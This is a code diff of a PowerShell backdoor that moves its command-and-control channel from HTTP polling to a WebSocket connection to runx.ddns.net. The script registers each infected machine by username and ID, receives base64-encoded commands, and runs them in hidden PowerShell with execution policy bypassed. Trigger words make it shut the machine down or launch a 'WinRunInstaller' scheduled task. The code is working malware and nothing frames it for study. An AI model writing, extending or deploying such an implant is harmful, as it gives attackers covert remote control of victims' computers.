@@ -8,7 +8,7 @@ if (-not $m2.WaitOne(0)) {
 	exit
 }
 
-$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
+$VPS_WS_URL = "ws://runx.ddns.net/ws/run"
 $IdPath = "$env:APPDATA\Microsoft\run\run.txt"
 
 if (Test-Path $IdPath) {
@@ -27,57 +27,82 @@ else {
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
 
+function Read-WebSocketFrame($ws, $cts) {
+	$ms = New-Object System.IO.MemoryStream
+	$buffer = New-Object byte[] 8192
+	$segment = New-Object System.ArraySegment[byte] -ArgumentList (,$buffer)
+	do {
+		$task = $ws.ReceiveAsync($segment, $cts.Token)
+		$task.Wait()
+		$res = $task.Result
+		if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
+			$ms.Dispose()
+			return $null
+		}
+		$ms.Write($buffer, 0, $res.Count)
+	} while (-not $res.EndOfMessage)
+
+	$bytes = $ms.ToArray()
+	$ms.Dispose()
+	return [System.Text.Encoding]::UTF8.GetString($bytes)
+}
+
+function Execute-CommandPayload($cmdBase64, $isVisible) {
+	if (-not $cmdBase64) { return }
+	$c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmdBase64))
+
+	if ($c -match "panic") {
+		exit
+	}
+	elseif ($c -match "altf4") {
+		Start-Process -FilePath "shutdown" -ArgumentList "/s", "/t", "0" -WindowStyle Hidden
+	}
+	elseif ($c -match "sauce") {
+		Start-ScheduledTask -TaskName "WinRunInstaller"
+	}
+	else {
+		$style = if ($isVisible -eq $true -or $isVisible -eq 1) {
+			"Normal"
+		}
+		else {
+			"Hidden"
+		}
+
+		Start-Process powershell.exe -ArgumentList @(
+			"-NoProfile",
+			"-ExecutionPolicy",
+			"Bypass",
+			"-Command",
+			$c
+		) -WindowStyle $style
+	}
+}
+
 try {
 	while ($true) {
 		try {
-			$u = $VPS_POLL_URL + "?username=" +
-			[System.Uri]::EscapeDataString($uniqueUser)
+			$ws = New-Object System.Net.WebSockets.ClientWebSocket
+			$cts = New-Object System.Threading.CancellationTokenSource
+			$wsUri = New-Object System.Uri("$VPS_WS_URL?username=$([System.Uri]::EscapeDataString($uniqueUser))")
 
-			$uri = New-Object System.Uri($u)
+			$connectTask = $ws.ConnectAsync($wsUri, $cts.Token)
+			if ($connectTask.Wait(8000) -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+				while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+					$jsonStr = Read-WebSocketFrame -ws $ws -cts $cts
+					if ($null -eq $jsonStr) { break }
 
-			$r = Invoke-RestMethod `
-				-Method Get `
-				-Uri $uri `
-				-TimeoutSec 10
-
-			if ($r.run -eq $true) {
-				$c = [System.Text.Encoding]::UTF8.GetString(
-					[System.Convert]::FromBase64String($r.cmd)
-				)
-
-				if ($c -match "panic") {
-					exit
-				}
-				elseif ($c -match "altf4") {
-					Start-Process `
-						-FilePath "shutdown" `
-						-ArgumentList "/s", "/t", "0" `
-						-WindowStyle Hidden
-				}
-				elseif ($c -match "sauce") {
-					Start-ScheduledTask `
-						-TaskName "WinRunInstaller"
-				}
-				else {
-					$style = if ($r.visible -eq $true) {
-						"Normal"
+					try {
+						$msg = $jsonStr | ConvertFrom-Json
+						if ($msg.action -eq "run_command" -and $msg.cmd) {
+							Execute-CommandPayload -cmdBase64 $msg.cmd -isVisible $msg.visible
+						}
 					}
-					else {
-						"Hidden"
-					}
-
-					Start-Process powershell.exe `
-						-ArgumentList @(
-						"-NoProfile",
-						"-ExecutionPolicy",
-						"Bypass",
-						"-Command",
-						$c
-					) -WindowStyle $style
+					catch {}
 				}
 			}
 		}
 		catch {}
+
 		Start-Sleep -Seconds 3
 	}
 }
